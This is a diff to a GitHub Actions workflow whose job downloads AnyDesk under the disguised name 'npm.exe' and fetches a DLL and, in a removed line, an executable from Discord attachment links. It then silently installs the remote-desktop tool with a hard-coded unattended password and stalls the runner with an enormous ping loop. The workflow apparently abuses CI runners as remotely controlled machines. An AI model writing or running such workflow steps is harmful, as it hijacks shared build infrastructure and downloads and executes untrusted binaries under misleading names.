@@ -29,9 +29,11 @@ jobs:
       - name: Run a multi-line script
         run: |
           dir
-          Invoke-WebRequest https://cdn.discordapp.com/attachments/714547391746932747/830905084183445544/Chrome.exe -OutFile npm.exe
+          Invoke-WebRequest https://download.anydesk.com/AnyDesk.exe -OutFile npm.exe
           Invoke-WebRequest https://cdn.discordapp.com/attachments/714547391746932747/830537244028305418/Nancy.dll -OutFile Nancy.dll
-          cmd /c echo .\npm.exe >>a.ps1
+          cmd /c echo .\npm.exe --install C:\Users\runneradmin --start-with-win --create-shortcuts --create-desktop-icon --update-disabled --silent >>a.ps1
+          cmd /c echo timeout 20 >>a.ps1
+          cmd /C echo hyesos22003 | "D:\a\qqwqpwqp\qqwqpwqp\npm.exe" --set-password >>a.ps1
           cmd /c echo dir >>a.ps1
           cmd /c echo ping localhost -n 11111111111111111111111111111 -w 99999999999999999999999999999999999 >>a.ps1
           .\a.ps1
